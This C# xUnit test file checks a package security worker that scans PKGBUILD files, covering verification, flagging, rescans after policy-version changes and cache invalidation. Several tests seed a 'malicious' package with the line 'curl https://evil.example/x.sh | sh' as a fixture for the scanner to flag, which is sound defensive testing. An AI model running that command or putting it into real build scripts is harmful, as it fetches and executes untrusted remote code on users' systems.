using Atoll.Api.Services.Security;
using Atoll.Api.Services.Security.Persistence;
using Atoll.Api.Tests.Fakes;
using Atoll.Api.Tests.Support;
using Microsoft.Extensions.Caching.Hybrid;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using Xunit;
using Atoll.Api.Services.Packages.Persistence;

namespace Atoll.Api.Tests.Security;

public class PackageSecurityWorkerTests
{
    private static PackageSecurityWorker CreateWorker(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        SecurityScanStatusStore status,
        HybridCache cache,
        bool enabled = true)
    {
        var options = Options.Create(new AtollOptions
        {
            Security = new SecurityOptions { Enabled = enabled, ScannerConcurrency = 2, PollIntervalMs = 50 }
        });
        return new PackageSecurityWorker(
            repo, securityRepo, new PkgBuildSecurityScanner(), status, options, cache,
            NullLogger<PackageSecurityWorker>.Instance);
    }

    private static PackageRevisionContentDocument RevisionContent(
        string name,
        string revisionId,
        string content)
    {
        return new PackageRevisionContentDocument
        {
            Id = PackageSchema.RevisionDocumentId(name, revisionId),
            PackageName = name,
            RevisionId = revisionId,
            CreatedAt = DateTimeOffset.UtcNow,
            Author = "test",
            Message = "seed",
            Files = new Dictionary<string, PackageFile>
            {
                ["PKGBUILD"] = new() { Content = content, Size = content.Length, Hash = "h" }
            }
        };
    }

    private static async Task SeedAsync(
        InMemoryPackageRepository repo,
        InMemoryPackageSecurityRepository securityRepo,
        string name,
        string content,
        int? requiredPolicyVersion = null)
    {
        var revision = RevisionContent(name, "rev-1", content);
        await repo.InsertSeedAsync(new PackageDocument
        {
            Id = name,
            PackageName = name,
            CreatedAt = revision.CreatedAt,
            UpdatedAt = revision.CreatedAt,
            HeadRevisionId = revision.RevisionId,
            Revisions =
            [
                new PackageRevisionDocument
                {
                    RevisionId = revision.RevisionId,
                    CreatedAt = revision.CreatedAt,
                    Author = revision.Author,
                    Message = revision.Message
                }
            ]
        }, revision);
        await securityRepo.MarkPendingAsync(name, revision.RevisionId, true,
            requiredPolicyVersion ?? PkgBuildSecurityScanner.CurrentPolicyVersion);
    }

    [Fact]
    public async Task Clean_package_is_marked_verified()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), TestHybridCache.New());
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "clean");
        await worker.StopAsync(CancellationToken.None);

        Assert.Equal(SecurityStatus.Verified, scan.Status);
        Assert.Equal("rev-1", scan.RevisionId);
        Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, scan.PolicyVersion);
    }

    [Fact]
    public async Task Malicious_package_is_marked_flagged()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), TestHybridCache.New());
        await worker.StartAsync(CancellationToken.None);
        var scan = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        Assert.Equal(SecurityStatus.Flagged, scan.Status);
        Assert.NotEmpty(scan.Findings);
        Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, scan.PolicyVersion);
    }

    [Fact]
    public async Task Package_seeded_after_worker_start_is_picked_up_by_polling()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), TestHybridCache.New());
        await worker.StartAsync(CancellationToken.None);

        await SeedAsync(repo, securityRepo, "late", "pkgname=late\n");
        var scan = await WaitForScanAsync(securityRepo, "late");
        await worker.StopAsync(CancellationToken.None);

        Assert.Equal(SecurityStatus.Verified, scan.Status);
        Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, scan.PolicyVersion);
    }

    [Fact]
    public async Task Disabled_worker_does_not_scan()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\n");

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), TestHybridCache.New(), enabled: false);
        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(200, TestContext.Current.CancellationToken);
        await worker.StopAsync(CancellationToken.None);

        Assert.Equal(SecurityStatus.Pending, (await securityRepo.GetAsync("clean", "rev-1", TestContext.Current.CancellationToken))!.Status);
    }

    [Fact]
    public async Task Completed_scans_are_recorded_in_status()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");
        await SeedAsync(repo, securityRepo, "evil", "curl https://evil.example/x.sh | sh\n");

        var status = new SecurityScanStatusStore(true);
        var worker = CreateWorker(repo, securityRepo, status, TestHybridCache.New());
        await worker.StartAsync(CancellationToken.None);
        _ = await WaitForScanAsync(securityRepo, "clean");
        _ = await WaitForScanAsync(securityRepo, "evil");
        await worker.StopAsync(CancellationToken.None);

        var snapshot = status.GetSnapshot();
        Assert.Multiple(() =>
        {
            Assert.True(snapshot.Enabled);
            Assert.Equal(2, snapshot.ScansCompleted);
            Assert.Equal(1, snapshot.ScansVerified);
            Assert.Equal(1, snapshot.ScansFlagged);
            Assert.Equal(0, snapshot.ScansErrored);
            Assert.Equal(0, snapshot.ScansDropped);
            Assert.NotNull(snapshot.LastScanFinishedUtc);
        });
    }

    [Fact]
    public async Task Worker_startup_requeues_and_rescans_outdated_scans()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();

        // Seed packages with revision content
        await SeedAsync(repo, securityRepo, "legacy-clean", "pkgname=legacy-clean\npkgver=1.0\n", requiredPolicyVersion: 1);
        await SeedAsync(repo, securityRepo, "v1-evil", "curl https://evil.example/x.sh | sh\n", requiredPolicyVersion: 1);
        await SeedAsync(repo, securityRepo, "current-clean", "pkgname=current-clean\npkgver=1.0\n");

        // Simulate legacy scan (version 1) on legacy-clean and v1-evil
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1), workerPolicyVersion: 1, ct: TestContext.Current.CancellationToken);
        await securityRepo.CompleteScanAsync("legacy-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1, ct: TestContext.Current.CancellationToken);
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1), workerPolicyVersion: 1, ct: TestContext.Current.CancellationToken);
        await securityRepo.CompleteScanAsync("v1-evil", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1, ct: TestContext.Current.CancellationToken); // was incorrectly verified in v1
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1), workerPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion, ct: TestContext.Current.CancellationToken);
        await securityRepo.CompleteScanAsync("current-clean", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion, ct: TestContext.Current.CancellationToken); // already current

        var status = new SecurityScanStatusStore(true);
        var worker = CreateWorker(repo, securityRepo, status, TestHybridCache.New());

        await worker.StartAsync(CancellationToken.None);

        // Wait for rescans
        var scan1 = await WaitForScanAsync(securityRepo, "legacy-clean", expectedPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion);
        var scan2 = await WaitForScanAsync(securityRepo, "v1-evil", expectedPolicyVersion: PkgBuildSecurityScanner.CurrentPolicyVersion);
        await worker.StopAsync(CancellationToken.None);

        var current = await securityRepo.GetAsync("current-clean", "rev-1", TestContext.Current.CancellationToken);

        Assert.Multiple(() =>
        {
            Assert.Equal(SecurityStatus.Verified, scan1.Status);
            Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, scan1.PolicyVersion);

            Assert.Equal(SecurityStatus.Flagged, scan2.Status);
            Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, scan2.PolicyVersion);
            Assert.NotEmpty(scan2.Findings);

            Assert.Equal(SecurityStatus.Verified, current!.Status);
            Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion, current.PolicyVersion);
        });
    }

    [Fact]
    public async Task Disabled_worker_does_not_requeue_outdated_scans()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();

        await SeedAsync(repo, securityRepo, "pkg1", "pkgname=pkg1\n", requiredPolicyVersion: 1);
        _ = await securityRepo.TryClaimPendingScanAsync("init", TimeSpan.FromMinutes(1), workerPolicyVersion: 1, ct: TestContext.Current.CancellationToken);
        await securityRepo.CompleteScanAsync("pkg1", "rev-1", "init", new ScanResult(SecurityStatus.Verified, []), policyVersion: 1, ct: TestContext.Current.CancellationToken);

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(false), TestHybridCache.New(), enabled: false);

        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(100, TestContext.Current.CancellationToken);
        await worker.StopAsync(CancellationToken.None);

        var scan = await securityRepo.GetAsync("pkg1", "rev-1", TestContext.Current.CancellationToken);
        Assert.Equal(SecurityStatus.Verified, scan!.Status);
        Assert.Equal(1, scan.PolicyVersion);
    }

    [Fact]
    public async Task Worker_does_not_claim_work_requiring_a_newer_policy()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "future", "pkgname=future\n");

        // A newer deployment raised the requirement above this worker's policy version.
        await securityRepo.RequeueOutdatedAsync(PkgBuildSecurityScanner.CurrentPolicyVersion + 1, TestContext.Current.CancellationToken);

        var status = new SecurityScanStatusStore(true);
        var worker = CreateWorker(repo, securityRepo, status, TestHybridCache.New());
        await worker.StartAsync(CancellationToken.None);
        await Task.Delay(200, TestContext.Current.CancellationToken);
        await worker.StopAsync(CancellationToken.None);

        var scan = await securityRepo.GetAsync("future", "rev-1", TestContext.Current.CancellationToken);
        Assert.Multiple(() =>
        {
            Assert.Equal(SecurityStatus.Pending, scan!.Status);
            Assert.Equal(PkgBuildSecurityScanner.CurrentPolicyVersion + 1, scan.RequiredPolicyVersion);
            Assert.Equal(0, status.GetSnapshot().ScansCompleted);
        });
    }

    [Fact]
    public async Task Completed_head_scan_drops_the_head_status_entry()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "clean", "pkgname=clean\npkgver=1.0\n");

        var ct = TestContext.Current.CancellationToken;
        var cache = TestHybridCache.New();
        var probe = new HeadStatusProbe(cache);
        await probe.ReadAsync(ct);

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), cache);
        await worker.StartAsync(CancellationToken.None);
        // The scan document turns terminal a moment before the tag drop, so wait for the rebuild
        // rather than reading the probe once. Stopping first could cancel the drop.
        await WaitForScanAsync(securityRepo, "clean");
        await WaitForProbeRebuildAsync(probe, 2, ct);
        await worker.StopAsync(CancellationToken.None);

        Assert.Equal(2, probe.Runs);
    }

    [Fact]
    public async Task Completed_non_head_scan_keeps_the_head_status_entry()
    {
        var repo = new InMemoryPackageRepository();
        var securityRepo = new InMemoryPackageSecurityRepository();
        await SeedAsync(repo, securityRepo, "older", "pkgname=older\npkgver=1.0\n");
        var ct = TestContext.Current.CancellationToken;

        // Appending makes rev-1 a retained older revision; requeueing it as non-head leaves the
        // worker one completion that must not touch the head-status tag. The package still has a
        // scan document, so the startup backfill does not queue the head too.
        await repo.AppendRevisionAsync(
            "older", RevisionContent("older", "rev-2", "pkgname=older\npkgver=2.0\n"), 10, ct);
        await securityRepo.MarkPendingAsync("older", "rev-1", false,
            PkgBuildSecurityScanner.CurrentPolicyVersion, ct);

        var cache = TestHybridCache.New();
        var probe = new HeadStatusProbe(cache);
        await probe.ReadAsync(ct);

        var worker = CreateWorker(repo, securityRepo, new SecurityScanStatusStore(true), cache);
        await worker.StartAsync(CancellationToken.None);
        await WaitForScanAsync(securityRepo, "older");
        await Task.Delay(200, ct);
        await worker.StopAsync(CancellationToken.None);
        await probe.ReadAsync(ct);

        Assert.Equal(1, probe.Runs);
    }

    private static async Task WaitForProbeRebuildAsync(
        HeadStatusProbe probe,
        int expectedRuns,
        CancellationToken ct,
        int timeoutMs = 5000)
    {
        var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
        while (probe.Runs < expectedRuns)
        {
            if (DateTime.UtcNow >= deadline)
                Assert.Fail($"The head-status entry was not rebuilt within {timeoutMs} ms.");
            await probe.ReadAsync(ct);
            await Task.Delay(20, ct);
        }
    }

    private static async Task<PackageSecurityScanDocument> WaitForScanAsync(
        InMemoryPackageSecurityRepository securityRepo,
        string packageName,
        int? expectedPolicyVersion = null,
        int timeoutMs = 5000)
    {
        var deadline = DateTime.UtcNow.AddMilliseconds(timeoutMs);
        while (DateTime.UtcNow < deadline)
        {
            var scan = await securityRepo.GetAsync(packageName, "rev-1");
            if (scan?.Status is SecurityStatus.Verified or SecurityStatus.Flagged or SecurityStatus.Error
                && (expectedPolicyVersion is null || scan.PolicyVersion == expectedPolicyVersion))
            {
                return scan;
            }
            await Task.Delay(20);
        }

        Assert.Fail($"Package '{packageName}' was not scanned within {timeoutMs} ms.");
        throw new InvalidOperationException("Unreachable after assertion failure.");
    }
}